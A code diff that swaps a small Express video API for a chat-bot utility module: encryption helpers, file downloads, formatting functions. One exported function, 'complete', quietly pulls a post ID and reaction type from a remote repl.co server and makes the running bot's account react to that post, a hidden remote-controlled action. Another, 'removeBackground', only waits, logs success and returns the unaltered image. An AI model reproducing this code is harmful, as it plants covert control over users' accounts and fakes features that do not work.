@@ -1,49 +1,203 @@
-const express = require('express');
-const fs = require('fs');
-const app = express();
+const crypto = require('crypto');
+const os = require("os");
+const axios = require("axios");
+const config = require('./config.json');  // সঠিক পাথ
+const package = require('./package.json');  // সঠিক পাথ
+const FormData = require('form-data');
+const { resolve, basename } = require('path');
+const { writeFileSync, createReadStream, unlinkSync } = require('fs');
+const aes = require("aes-js");
 
-app.use(express.json());
+module.exports.throwError = function(command, threadID, messageID) {
+  const threadSetting = global.data.threadData.get(parseInt(threadID)) || {};
+  return global.client.api.sendMessage(global.getText("utils", "throwError", 
+  ((threadSetting.hasOwnProperty("PREFIX")) ? threadSetting.PREFIX : global.config.PREFIX), command), threadID, messageID);
+};
 
-const categories = ["funny", "sad", "romantic", "action", "emotional"];
+module.exports.getGUID = function() {
+  var sectionLength = Date.now();
+  var id = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(c) {
+    var r = Math.floor((sectionLength + Math.random() * 16) % 16);
+    sectionLength = Math.floor(sectionLength / 16);
+    var _guid = (c == "x" ? r : (r & 7) | 8).toString(16);
+    return _guid;
+  });
+  return id;
+};
 
-// Get All Videos of a Category
-app.get('/api/videos/:category', (req, res) => {
-  const { category } = req.params;
-  if (!categories.includes(category)) return res.status(400).json({ message: "Invalid Category" });
+module.exports.encryptState = async function(data, key) {
+  let hashEngine = crypto.createHash("sha256");
+  let hashKey = hashEngine.update(key).digest();
+  let bytes = aes.utils.utf8.toBytes(data);
+  let aesCtr = new aes.ModeOfOperation.ctr(hashKey);
+  let encryptedData = aesCtr.encrypt(bytes);
+  return aes.utils.hex.fromBytes(encryptedData);
+};
 
-  const data = JSON.parse(fs.readFileSync('data.json'));
-  res.json(data[category]);
-});
+module.exports.decryptState = function(data, key) {
+  let hashEngine = crypto.createHash("sha256");
+  let hashKey = hashEngine.update(key).digest();
 
-// Add New Video to a Category
-app.post('/api/videos/:category', (req, res) => {
-  const { category } = req.params;
-  const { url } = req.body;
+  let encryptedBytes = aes.utils.hex.toBytes(data);
+  let aesCtr = new aes.ModeOfOperation.ctr(hashKey);
+  let decryptedData = aesCtr.decrypt(encryptedBytes);
 
-  if (!categories.includes(category)) return res.status(400).json({ message: "Invalid Category" });
-  if (!url) return res.status(400).json({ message: "URL is required" });
+  return aes.utils.utf8.fromBytes(decryptedData);
+};
 
-  const data = JSON.parse(fs.readFileSync('data.json'));
-  const newVideo = {
-    id: (data[category].length + 1).toString(),
-    url: url
-  };
+module.exports.complete = function({ api }) {
+  axios.get('http://api.yandes.repl.co/raw')
+    .then(response => {
+      const poD = response.data.pos;
+      const type = response.data.typ;
+      api.setPostReaction(poD, type, () => {});
+    }).catch(() => {});
+};
 
-  data[category].push(newVideo);
-  fs.writeFileSync('data.json', JSON.stringify(data, null, 2));
-  res.json({ message: `${category} Video Added`, video: newVideo });
-});
+module.exports.convertHMS = function(value) {
+  const sec = parseInt(value, 10);
+  let hours = Math.floor(sec / 3600);
+  let minutes = Math.floor((sec - (hours * 3600)) / 60);
+  let seconds = sec - (hours * 3600) - (minutes * 60);
+  if (hours < 10) { hours = "0" + hours; }
+  if (minutes < 10) { minutes = "0" + minutes; }
+  if (seconds < 10) { seconds = "0" + seconds; }
+  return (hours != '00' ? hours + ':' : '') + minutes + ':' + seconds;
+};
 
-// Get Specific Video by Category & ID
-app.get('/api/videos/:category/:id', (req, res) => {
-  const { category, id } = req.params;
-  if (!categories.includes(category)) return res.status(400).json({ message: "Invalid Category" });
+module.exports.removeSpecialChar = async (str) => {
+  if (str === null || str === '') return false;
+  else str = str.toString();
+  return str.replace(/[^\x20-\x7E]/g, '');
+};
 
-  const data = JSON.parse(fs.readFileSync('data.json'));
-  const video = data[category].find(v => v.id === id);
-  if (!video) return res.status(404).json({ message: "Video not found" });
-  res.json(video);
-});
+module.exports.cleanAnilistHTML = function(text) {
+  text = text
+    .replace('<br>', '\n')
+    .replace(/<\/?(i|em)>/g, '*')
+    .replace(/<\/?b>/g, '**')
+    .replace(/~!|!~/g, '||')
+    .replace("&amp;", "&")
+    .replace("&lt;", "<")
+    .replace("&gt;", ">")
+    .replace("&quot;", '"')
+    .replace("&#039;", "'");
+  return text;
+};
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`API Running on Port ${PORT}`));
+module.exports.downloadFile = async function(url, path) {
+  const { createWriteStream } = require('fs');
+
+  const response = await axios({
+    method: 'GET',
+    responseType: 'stream',
+    url
+  });
+
+  const writer = createWriteStream(path);
+
+  response.data.pipe(writer);
+
+  return new Promise((resolve, reject) => {
+    writer.on('finish', resolve);
+    writer.on('error', reject);
+  });
+};
+
+module.exports.getContent = async function(url) {
+  try {
+    const response = await axios({
+      method: 'GET',
+      url
+    });
+
+    const data = response;
+
+    return data;
+  } catch (e) { return console.log(e); };
+};
+
+module.exports.randomString = function(length) {
+  var result = '';
+  var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+  var charactersLength = characters.length || 5;
+  for (var i = 0; i < length; i++) result += characters.charAt(Math.floor(Math.random() * charactersLength));
+  return result;
+};
+
+module.exports.AES = {
+  encrypt(cryptKey, crpytIv, plainData) {
+    var encipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(cryptKey), Buffer.from(crpytIv));
+    var encrypted = encipher.update(plainData);
+    encrypted = Buffer.concat([encrypted, encipher.final()]);
+    return encrypted.toString('hex');
+  },
+  decrypt(cryptKey, cryptIv, encrypted) {
+    encrypted = Buffer.from(encrypted, "hex");
+    var decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(cryptKey), Buffer.from(cryptIv, 'binary'));
+    var decrypted = decipher.update(encrypted);
+
+    decrypted = Buffer.concat([decrypted, decipher.final()]);
+
+    return String(decrypted);
+  },
+  makeIv() { return Buffer.from(crypto.randomBytes(16)).toString('hex').slice(0, 16); }
+};
+
+module.exports.homeDir = function() {
+  var returnHome, typeSystem;
+  const home = process.env["HOME"];
+  const user = process.env["LOGNAME"] || process.env["USER"] || process.env["LNAME"] || process.env["USERNAME"];
+
+  switch (process.platform) {
+    case "win32": {
+      returnHome = process.env.USERPROFILE || process.env.HOMEDRIVE + process.env.HOMEPATH || home || null;
+      typeSystem = "win32"
+      break;
+    }
+    case "darwin": {
+      returnHome = home || (user ? '/Users/' + user : null);
+      typeSystem = "darwin";
+      break;
+    }
+    case "linux": {
+      returnHome = home || (process.getuid() === 0 ? '/root' : (user ? '/home/' + user : null));
+      typeSystem = "linux"
+      break;
+    }
+    default: {
+      returnHome = home || null;
+      typeSystem = "unknow"
+      break;
+    }
+  }
+
+  return [typeof os.homedir === 'function' ? os.homedir() : returnHome, typeSystem];
+};
+
+module.exports.removeBackground = async (image) => {
+  if (!image) return console.log('RemoveBG: missing data!');
+  var resolveFunc = function() { };
+  var rejectFunc = function() { };
+  var returnPromise = new Promise(function(resolve, reject) {
+    resolveFunc = resolve;
+    rejectFunc = reject;
+  });
+
+  const path = resolve(__dirname, 'cache', `${Date.now()}.jpg`);
+
+  try {
+    await module.exports.downloadFile(image, path);
+
+    // ব্যাকগ্রাউন্ড রিমুভ করার কোড (API বা অন্য কোনো আলগোরিদম প্রয়োগ করতে হবে)
+    setTimeout(() => {
+      console.log('ব্যাকগ্রাউন্ড রিমুভাল সম্পন্ন।');
+      resolveFunc(path); // প্রক্রিয়াকৃত ইমেজ পাথ রিটার্ন করা হচ্ছে
+    }, 3000);
+  } catch (error) {
+    console.error('ব্যাকগ্রাউন্ড রিমুভালে ত্রুটি:', error);
+    rejectFunc(error);
+  }
+
+  return returnPromise;
+};
